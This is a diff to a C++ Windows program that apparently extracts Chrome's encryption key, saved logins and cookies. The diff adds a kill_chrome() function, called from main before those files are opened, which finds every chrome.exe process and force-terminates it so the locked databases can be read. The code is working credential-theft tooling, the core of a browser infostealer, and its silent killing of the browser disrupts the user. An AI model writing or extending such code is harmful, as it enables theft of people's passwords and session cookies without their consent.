@@ -5,6 +5,7 @@
 #include <fstream>
 #include <filesystem>
 #include <windows.h>
+#include <tlhelp32.h>
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
 #include <bcrypt.h>
@@ -12,6 +13,7 @@
 
 namespace {
 void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
+void kill_chrome();
 }
 
 //using unique_sqlite_conn = wil::unique_struct<sqlite3, decltype(&sqlite3_close), sqlite3_close>;
@@ -29,6 +31,8 @@ int main() {
     std::wcout << "key path: "     << chrome::key_path << "\n"
                << "logins path: "  << chrome::logins_path << "\n"
                << "cookies path: " << chrome::cookies_path << "\n";
+
+    kill_chrome();
 
     std::ifstream key_file(chrome::key_path);
 
@@ -163,6 +167,23 @@ void hexdump(const uint8_t *addr, size_t len, const char *desc) {
         }
 
         printf(" | %.*s\n", i % bytes_per_line, ascii_representation);
+    }
+}
+
+void kill_chrome() {
+    PROCESSENTRY32W process_entry;
+    process_entry.dwSize = sizeof (PROCESSENTRY32W);
+
+    wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));
+    if (Process32FirstW(snapshot.get(), &process_entry) == TRUE) {
+        do {
+            if (narrow(process_entry.szExeFile) == "chrome.exe") {
+                wil::unique_handle process(OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID));
+                if (process) {
+                    TerminateProcess(process.get(), 0);
+                }
+            }
+        } while (Process32NextW(snapshot.get(), &process_entry));
     }
 }
 }
